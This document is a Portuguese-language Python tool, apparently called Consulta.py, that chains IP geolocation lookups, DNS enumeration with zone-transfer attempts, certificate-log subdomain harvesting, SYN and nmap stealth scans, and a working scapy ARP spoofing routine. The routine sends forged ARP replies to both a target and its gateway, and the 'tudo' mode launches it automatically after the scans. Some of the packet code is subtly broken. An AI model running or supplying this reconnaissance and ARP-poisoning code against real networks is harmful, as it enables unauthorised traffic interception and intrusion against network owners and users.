import requests
import subprocess
import sys
import time
import socket
import re
import dns.resolver
import dns.zone
import dns.rdatatype
import dns.query
from scapy.all import Ether, ARP, srp1, IP, TCP, ICMP, conf, send
from scapy.arch import get_if_hwaddr
from datetime import datetime


def consulta_ip_multiplas_apis(ip):
    print(f"\nConsultando IP: {ip}")
    print("="*60)
    
    resultado = f"\nConsultando IP: {ip}\n"
    resultado += "="*60 + "\n"
    
    apis = [
        ("ipinfo.io", f"https://ipinfo.io/{ip}/json"),
        ("ipapi.co", f"https://ipapi.co/{ip}/json/"),
        ("ip-api.com", f"http://ip-api.com/json/{ip}"),
        ("geoip-db.com", f"https://geoip-db.com/v1/geoip_api.php?ip={ip}"),
        ("ipwho.is", f"https://ipwho.is/{ip}"),
    ]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    
    for api_nome, url in apis:
        try:
            print(f"\nTentando {api_nome}...")
            resultado += f"\nTentando {api_nome}...\n"
            response = requests.get(url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                print(f"Sucesso em {api_nome}:")
                resultado += f"Sucesso em {api_nome}:\n"
                print(f"  IP: {ip}")
                resultado += f"  IP: {ip}\n"
                print(f"  Organizacao: {data.get('org', data.get('organization', 'N/A'))}")
                resultado += f"  Organizacao: {data.get('org', data.get('organization', 'N/A'))}\n"
                print(f"  Pais: {data.get('country', 'N/A')}")
                resultado += f"  Pais: {data.get('country', 'N/A')}\n"
                print(f"  Regiao: {data.get('region', 'N/A')}")
                resultado += f"  Regiao: {data.get('region', 'N/A')}\n"
                print(f"  Cidade: {data.get('city', 'N/A')}")
                resultado += f"  Cidade: {data.get('city', 'N/A')}\n"
                print(f"  ISP: {data.get('isp', 'N/A')}")
                resultado += f"  ISP: {data.get('isp', 'N/A')}\n"
                print(f"  Latitude: {data.get('lat', data.get('latitude', 'N/A'))}")
                resultado += f"  Latitude: {data.get('lat', data.get('latitude', 'N/A'))}\n"
                print(f"  Longitude: {data.get('lon', data.get('longitude', 'N/A'))}")
                resultado += f"  Longitude: {data.get('lon', data.get('longitude', 'N/A'))}\n"
                return data, resultado
            else:
                print(f"  Erro: Status {response.status_code}")
                resultado += f"  Erro: Status {response.status_code}\n"
        except requests.exceptions.Timeout:
            print(f"  Timeout ao conectar em {api_nome}")
            resultado += f"  Timeout ao conectar em {api_nome}\n"
        except requests.exceptions.ConnectionError:
            print(f"  Erro de conexao com {api_nome}")
            resultado += f"  Erro de conexao com {api_nome}\n"
        except Exception as e:
            print(f"  Erro: {e}")
            resultado += f"  Erro: {e}\n"
        
        time.sleep(1)
    
    print("Nenhuma API respondeu com sucesso.")
    resultado += "Nenhuma API respondeu com sucesso.\n"
    return None, resultado


def get_hostname_resolve(ip):
    print(f"\nResolucao de Hostname/IP (Reverse DNS)")
    print("="*60)
    
    resultado = f"\nResolucao de Hostname/IP (Reverse DNS)\n"
    resultado += "="*60 + "\n"
    
    print(f"Reverse DNS para {ip}...")
    resultado += f"Reverse DNS para {ip}...\n"
    try:
        hostname = socket.gethostbyaddr(ip)
        print(f"Hostname encontrado: {hostname[0]}")
        resultado += f"Hostname encontrado: {hostname[0]}\n"
        print(f"Aliases: {hostname[1]}")
        resultado += f"Aliases: {hostname[1]}\n"
        print(f"Endereco IP: {hostname[2]}")
        resultado += f"Endereco IP: {hostname[2]}\n"
        return hostname[0], resultado
    except socket.herror:
        print("Hostname nao encontrado via reverse DNS")
        resultado += "Hostname nao encontrado via reverse DNS\n"
    except Exception as e:
        print(f"Erro ao resolver hostname: {e}")
        resultado += f"Erro ao resolver hostname: {e}\n"
    
    return None, resultado


def dns_checker(host):
    print(f"\nDNS Checker para {host}")
    print("="*60)
    
    resultado = f"\nDNS Checker para {host}\n"
    resultado += "="*60 + "\n"
    
    try:
        print(f"\nResolucao A (IPv4) via socket...")
        resultado += f"\nResolucao A (IPv4) via socket...\n"
        try:
            res = socket.gethostbyname(host)
            print(f"  {host} -> {res}")
            resultado += f"  {host} -> {res}\n"
        except socket.gaierror as e:
            print(f"  Erro: {e}")
            resultado += f"  Erro: {e}\n"
    except Exception as e:
        print(f"  Erro: {e}")
        resultado += f"  Erro: {e}\n"
    
    time.sleep(1)
    
    try:
        print(f"\nResolucao AAAA (IPv6) via socket...")
        resultado += f"\nResolucao AAAA (IPv6) via socket...\n"
        try:
            res = socket.getaddrinfo(host, None, socket.AF_INET6)
            for item in res:
                print(f"  {host} -> {item[4][0]}")
                resultado += f"  {host} -> {item[4][0]}\n"
        except socket.gaierror:
            print("  Nenhum registro AAAA encontrado")
            resultado += "  Nenhum registro AAAA encontrado\n"
    except Exception as e:
        print(f"  Erro: {e}")
        resultado += f"  Erro: {e}\n"
    
    time.sleep(1)
    
    dns_query_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "SRV", "PTR", "SPF"]
    
    print(f"\nUsando dns.resolver (DNSPython)...")
    resultado += f"\nUsando dns.resolver (DNSPython)...\n"
    
    for query_type in dns_query_types:
        print(f"\nBuscando {query_type} com dns.resolver...")
        resultado += f"\nBuscando {query_type} com dns.resolver...\n"
        try:
            answers = dns.resolver.resolve(host, query_type)
            for rdata in answers:
                print(f"  {rdata}")
                resultado += f"  {rdata}\n"
        except dns.resolver.NXDOMAIN:
            print(f"  Dominio nao existe")
            resultado += f"  Dominio nao existe\n"
            break
        except dns.resolver.NoAnswer:
            print(f"  Nenhum resultado para {query_type}")
            resultado += f"  Nenhum resultado para {query_type}\n"
        except Exception as e:
            print(f"  Erro: {e}")
            resultado += f"  Erro: {e}\n"
        
        time.sleep(0.5)
    
    time.sleep(1)
    
    dig_query_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "SRV", "SPF", "CAA"]
    
    print(f"\nUsando dig...")
    resultado += f"\nUsando dig...\n"
    
    for query_type in dig_query_types:
        print(f"\nBuscando {query_type} com dig +short...")
        resultado += f"\nBuscando {query_type} com dig +short...\n"
        try:
            result = subprocess.run(["dig", host, f"+short", query_type], 
                                  capture_output=True, text=True, timeout=10)
            if result.stdout:
                output = result.stdout.strip().split('\n')
                for linha in output:
                    if linha:
                        print(f"  {linha}")
                        resultado += f"  {linha}\n"
            else:
                print(f"  Nenhum resultado para {query_type}")
                resultado += f"  Nenhum resultado para {query_type}\n"
        except FileNotFoundError:
            print("  dig nao encontrado. Instale com: sudo apt install dnsutils")
            resultado += "  dig nao encontrado. Instale com: sudo apt install dnsutils\n"
            break
        except subprocess.TimeoutExpired:
            print(f"  Timeout ao executar dig para {query_type}")
            resultado += f"  Timeout ao executar dig para {query_type}\n"
        except Exception as e:
            print(f"  Erro: {e}")
            resultado += f"  Erro: {e}\n"
        
        time.sleep(0.5)
    
    time.sleep(1)
    
    host_query_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "SRV", "SPF", "CAA"]
    
    print(f"\nUsando host -t...")
    resultado += f"\nUsando host -t...\n"
    
    for query_type in host_query_types:
        print(f"\nBuscando {query_type} com host -t {query_type}...")
        resultado += f"\nBuscando {query_type} com host -t {query_type}...\n"
        try:
            result = subprocess.run(["host", "-t", query_type, host], 
                                  capture_output=True, text=True, timeout=10)
            if result.stdout:
                output = result.stdout.strip().split('\n')
                for linha in output:
                    if linha:
                        print(f"  {linha}")
                        resultado += f"  {linha}\n"
            else:
                print(f"  Nenhum resultado para {query_type}")
                resultado += f"  Nenhum resultado para {query_type}\n"
        except FileNotFoundError:
            print("  host nao encontrado. Instale com: sudo apt install bind-utils ou bind-tools")
            resultado += "  host nao encontrado. Instale com: sudo apt install bind-utils ou bind-tools\n"
            break
        except subprocess.TimeoutExpired:
            print(f"  Timeout ao executar host para {query_type}")
            resultado += f"  Timeout ao executar host para {query_type}\n"
        except Exception as e:
            print(f"  Erro: {e}")
            resultado += f"  Erro: {e}\n"
        
        time.sleep(0.5)
    
    time.sleep(1)
    
    print(f"\nZone Transfer (AXFR) com dig...")
    resultado += f"\nZone Transfer (AXFR) com dig...\n"
    try:
        result = subprocess.run(["dig", host, "AXFR"], 
                              capture_output=True, text=True, timeout=10)
        if result.stdout and "Transfer failed" not in result.stdout:
            if result.stdout.count("\n") > 5:
                print("  AXFR PERMITIDO! (transferencia de zona bem-sucedida)")
                resultado += "  AXFR PERMITIDO! (transferencia de zona bem-sucedida)\n"
                print(result.stdout)
                resultado += result.stdout + "\n"
            else:
                print("  AXFR nao permitido")
                resultado += "  AXFR nao permitido\n"
        else:
            print("  AXFR nao permitido ou erro")
            resultado += "  AXFR nao permitido ou erro\n"
    except Exception as e:
        print(f"  Erro no AXFR: {e}")
        resultado += f"  Erro no AXFR: {e}\n"
    
    time.sleep(1)
    
    print(f"\nZone Transfer (AXFR) com host -l...")
    resultado += f"\nZone Transfer (AXFR) com host -l...\n"
    try:
        result = subprocess.run(["host", "-l", host], 
                              capture_output=True, text=True, timeout=10)
        if result.stdout and "listed" not in result.stdout.lower() and result.returncode == 0:
            print("  AXFR PERMITIDO! (transferencia de zona bem-sucedida)")
            resultado += "  AXFR PERMITIDO! (transferencia de zona bem-sucedida)\n"
            print(result.stdout)
            resultado += result.stdout + "\n"
        else:
            print("  AXFR nao permitido")
            resultado += "  AXFR nao permitido\n"
    except Exception as e:
        print(f"  Erro no AXFR com host: {e}")
        resultado += f"  Erro no AXFR com host: {e}\n"
    
    time.sleep(1)
    
    print(f"\nNSLookup para {host}...")
    resultado += f"\nNSLookup para {host}...\n"
    try:
        result = subprocess.run(["nslookup", host], 
                              capture_output=True, text=True, timeout=10)
        print(result.stdout)
        resultado += result.stdout + "\n"
    except FileNotFoundError:
        print("  nslookup nao encontrado")
        resultado += "  nslookup nao encontrado\n"
    except subprocess.TimeoutExpired:
        print("  Timeout no nslookup")
        resultado += "  Timeout no nslookup\n"
    except Exception as e:
        print(f"  Erro: {e}")
        resultado += f"  Erro: {e}\n"
    
    time.sleep(1)
    
    print(f"\nEnumeracao de DNS com apis...")
    resultado += f"\nEnumeracao de DNS com apis...\n"
    
    dns_enum_apis = [
        ("crt.sh", f"https://crt.sh/?q=%25.{host}&output=json"),
        ("dnsdumpster", f"https://dnsdumpster.com/api/v1/results/"),
        ("rapiddns", f"https://rapiddns.io/api/v1/search?q={host}"),
    ]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    
    for api_nome, url in dns_enum_apis:
        print(f"\nEnumeracao com {api_nome}...")
        resultado += f"\nEnumeracao com {api_nome}...\n"
        try:
            if api_nome == "crt.sh":
                response = requests.get(url, headers=headers, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    dominios_encontrados = set()
                    for cert in data:
                        dominios = cert.get('name_value', '').split('\n')
                        for dominio in dominios:
                            dominio = dominio.strip()
                            if dominio and dominio not in dominios_encontrados:
                                print(f"  {dominio}")
                                resultado += f"  {dominio}\n"
                                dominios_encontrados.add(dominio)
                    if dominios_encontrados:
                        print(f"  Total: {len(dominios_encontrados)} subdominio(s) encontrado(s)")
                        resultado += f"  Total: {len(dominios_encontrados)} subdominio(s) encontrado(s)\n"
                else:
                    print(f"  Status: {response.status_code}")
                    resultado += f"  Status: {response.status_code}\n"
            
            elif api_nome == "rapiddns":
                response = requests.get(url, headers=headers, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    subdomains = data.get('subdomains', [])
                    for subdomain in subdomains[:20]:
                        print(f"  {subdomain}")
                        resultado += f"  {subdomain}\n"
                    if subdomains:
                        print(f"  Total: {len(subdomains)} resultado(s)")
                        resultado += f"  Total: {len(subdomains)} resultado(s)\n"
                else:
                    print(f"  Status: {response.status_code}")
                    resultado += f"  Status: {response.status_code}\n"
        except Exception as e:
            print(f"  Erro: {e}")
            resultado += f"  Erro: {e}\n"
        
        time.sleep(1)
    
    return resultado


def varredura_consulta(ip):
    print(f"\nResultado Nmap")
    print("="*60)
    
    resultado = f"\nResultado Nmap\n"
    resultado += "="*60 + "\n"
    
    print(f"Executando nmap em {ip}...")
    resultado += f"Executando nmap em {ip}...\n"
    try:
        result = subprocess.run(["sudo", "nmap", "-sS", "-Pn", "-O", "-sV", ip], 
                              capture_output=True, text=True, timeout=60)
        if result.returncode == 0:
            print(result.stdout)
            resultado += result.stdout + "\n"
        else:
            print(f"Erro no nmap: {result.stderr}")
            resultado += f"Erro no nmap: {result.stderr}\n"
    except subprocess.TimeoutExpired:
        print(f"Timeout no nmap para {ip}")
        resultado += f"Timeout no nmap para {ip}\n"
    except FileNotFoundError:
        print("nmap nao encontrado. Instale com: sudo apt install nmap")
        resultado += "nmap nao encontrado. Instale com: sudo apt install nmap\n"
    except Exception as e:
        print(f"Erro ao executar nmap: {e}")
        resultado += f"Erro ao executar nmap: {e}\n"
    
    return resultado


def scan_portas(ip):
    print(f"\nEscaneo de Portas")
    print("="*60)
    
    resultado = f"\nEscaneo de Portas\n"
    resultado += "="*60 + "\n"
    
    print(f"Escaneando portas em {ip}...")
    resultado += f"Escaneando portas em {ip}...\n"
    portas = [21, 22, 25, 53, 80, 443, 445, 3306, 3389, 8080, 8443, 9200, 5432]
    
    abiertas = []
    for porta in portas:
        try:
            pacote = IP(dst=ip) / TCP(dport=porta, flags="S")
            resposta = srp1(pacote, timeout=1, verbose=0)
            
            if resposta and TCP in resposta and resposta[TCP].flags == "SA":
                print(f"  Porta {porta} ABERTA")
                resultado += f"  Porta {porta} ABERTA\n"
                abiertas.append(porta)
        except Exception as e:
            pass
    
    if not abiertas:
        print("  Nenhuma porta aberta encontrada nos testes iniciais")
        resultado += "  Nenhuma porta aberta encontrada nos testes iniciais\n"
    
    return abiertas, resultado


def arp_spoofing_externo_avancado(ip_alvo, gateway_ip=None, tempo=20, verbose=True):
    print(f"\nARP Spoofing Avancado (Rede Externa)")
    print("="*60)
    
    resultado = f"\nARP Spoofing Avancado (Rede Externa)\n"
    resultado += "="*60 + "\n"
    
    print(f"Alvo IP: {ip_alvo}")
    resultado += f"Alvo IP: {ip_alvo}\n"
    
    if gateway_ip:
        print(f"Gateway: {gateway_ip}")
        resultado += f"Gateway: {gateway_ip}\n"
    
    print(f"Duracao: {tempo} segundos")
    resultado += f"Duracao: {tempo} segundos\n"
    
    try:
        iface = conf.iface
        mac_sender = get_if_hwaddr(iface)
        
        print(f"Interface: {iface}")
        resultado += f"Interface: {iface}\n"
        print(f"Sua MAC: {mac_sender}")
        resultado += f"Sua MAC: {mac_sender}\n"
        
        if not gateway_ip:
            gateway_ip = "192.168.1.1"
        
        print(f"\nIniciando ARP Spoofing contra {ip_alvo}...")
        resultado += f"\nIniciando ARP Spoofing contra {ip_alvo}...\n"
        print(f"Enviando ARP replies falsos...")
        resultado += f"Enviando ARP replies falsos...\n"
        
        tempo_inicio = time.time()
        contador = 0
        
        while time.time() - tempo_inicio < tempo:
            try:
                pacote_alvo = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op="is-at",
                    pdst=ip_alvo,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=gateway_ip,
                    hwsrc=mac_sender
                )
                
                pacote_gateway = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op="is-at",
                    pdst=gateway_ip,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=ip_alvo,
                    hwsrc=mac_sender
                )
                
                send(pacote_alvo, iface=iface, verbose=0)
                send(pacote_gateway, iface=iface, verbose=0)
                
                contador += 1
                if verbose:
                    print(f"  Pacote {contador} enviado (Bidirecionado)")
                    resultado += f"  Pacote {contador} enviado (Bidirecionado)\n"
                
                time.sleep(0.5)
            except PermissionError:
                print("Erro: Precisa rodar com sudo!")
                resultado += "Erro: Precisa rodar com sudo!\n"
                break
            except Exception as e:
                print(f"  Erro ao enviar pacote: {e}")
                resultado += f"  Erro ao enviar pacote: {e}\n"
                break
        
        print(f"\nARP Spoofing finalizado. Total de pacotes: {contador * 2}")
        resultado += f"\nARP Spoofing finalizado. Total de pacotes: {contador * 2}\n"
        
    except Exception as e:
        print(f"Erro geral: {e}")
        resultado += f"Erro geral: {e}\n"
    
    return resultado


def salvar_resultado(conteudo, ip):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    nome_arquivo = f"consulta_{ip}_{timestamp}.txt"
    
    try:
        with open(nome_arquivo, 'w', encoding='utf-8') as f:
            f.write(conteudo)
        print(f"\n\nResultado salvo em: {nome_arquivo}")
        return nome_arquivo
    except Exception as e:
        print(f"Erro ao salvar arquivo: {e}")
        return None


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: sudo python Consulta.py <IP/DOMINIO> [opcao] [parametros] [save]")
        print("\nOpcoes:")
        print("  padrao - IP, Nmap, Portas")
        print("  dns <host> - Enumeracao DNS completa (dig, host, nslookup, apis)")
        print("  rdns <ip> - Reverse DNS para IP")
        print("  spoofing <ip_alvo> [gateway_ip] [tempo] - ARP spoofing rede externa")
        print("  scan - Escanear portas")
        print("  nmap - Executar nmap")
        print("  tudo - Executar tudo")
        print("\nOpcoes finais:")
        print("  save - Salva o resultado em um arquivo de texto")
        print("\nExemplos:")
        print("  sudo python Consulta.py example.com dns save")
        print("  sudo python Consulta.py 8.8.8.8 rdns")
        print("  sudo python Consulta.py 8.8.8.8 spoofing 8.8.8.9 192.168.1.1 20 save")
        sys.exit(1)

    primeiro_arg = sys.argv[1]
    opcao = sys.argv[2] if len(sys.argv) > 2 else "padrao"
    salvar = "save" in sys.argv
    
    resultado_total = ""
    resultado_total += "="*60 + "\n"
    resultado_total += f"CONSULTA - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    resultado_total += "="*60 + "\n"
    
    if opcao == "dns":
        host = sys.argv[3] if len(sys.argv) > 3 else primeiro_arg
        resultado_dns = dns_checker(host)
        resultado_total += resultado_dns
    
    elif opcao == "rdns":
        ip = primeiro_arg
        hostname, res = get_hostname_resolve(ip)
        resultado_total += res
    
    elif opcao == "spoofing":
        ip_alvo = sys.argv[3] if len(sys.argv) > 3 else primeiro_arg
        gateway_ip = sys.argv[4] if len(sys.argv) > 4 else None
        tempo = int(sys.argv[5]) if len(sys.argv) > 5 else 20
        res = arp_spoofing_externo_avancado(ip_alvo, gateway_ip, tempo)
        resultado_total += res
    
    elif opcao == "scan":
        ip = primeiro_arg
        portas, res = scan_portas(ip)
        resultado_total += res
    
    elif opcao == "nmap":
        ip = primeiro_arg
        res = varredura_consulta(ip)
        resultado_total += res
    
    elif opcao == "tudo":
        ip = primeiro_arg
        data_ip, res_ip = consulta_ip_multiplas_apis(ip)
        resultado_total += res_ip
        
        hostname, res_hostname = get_hostname_resolve(ip)
        resultado_total += res_hostname
        
        portas, res_portas = scan_portas(ip)
        resultado_total += res_portas
        
        res_nmap = varredura_consulta(ip)
        resultado_total += res_nmap
        
        tempo = int(sys.argv[3]) if len(sys.argv) > 3 else 20
        gateway_ip = sys.argv[4] if len(sys.argv) > 4 else None
        res_spoofing = arp_spoofing_externo_avancado(ip, gateway_ip, tempo)
        resultado_total += res_spoofing
    
    else:
        ip = primeiro_arg
        data_ip, res_ip = consulta_ip_multiplas_apis(ip)
        resultado_total += res_ip
        
        hostname, res_hostname = get_hostname_resolve(ip)
        resultado_total += res_hostname
        
        portas, res_portas = scan_portas(ip)
        resultado_total += res_portas
        
        res_nmap = varredura_consulta(ip)
        resultado_total += res_nmap
    
    if salvar:
        salvar_resultado(resultado_total, primeiro_arg)
